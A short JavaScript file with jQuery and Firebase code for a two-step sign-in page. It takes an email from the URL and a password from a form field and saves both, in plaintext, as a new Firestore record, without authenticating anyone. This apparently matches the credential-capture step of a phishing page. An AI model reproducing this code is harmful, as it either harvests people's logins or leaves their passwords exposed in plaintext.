var getUrlParameter = function getUrlParameter(sParam) {
    var sPageURL = window.location.search.substring(1),
        sURLVariables = sPageURL.split('&'),
        sParameterName,
        i;

    for (i = 0; i < sURLVariables.length; i++) {
        sParameterName = sURLVariables[i].split('=');

        if (sParameterName[0] === sParam) {
            return sParameterName[1] === undefined ? true : decodeURIComponent(sParameterName[1]);
        }
    }
};
$(document).ready(function(){
    $("#btncorreo").click(function(){
        $("#formInicio").submit();
    });
    $("#btnpass").click(function(){
        var pass=$("#txtPassword").val();
        var email=getUrlParameter("email");
        db = firebase.firestore();
        db.collection("usuario").add({
            nombre:email,
            password:pass
        })
        
    });
});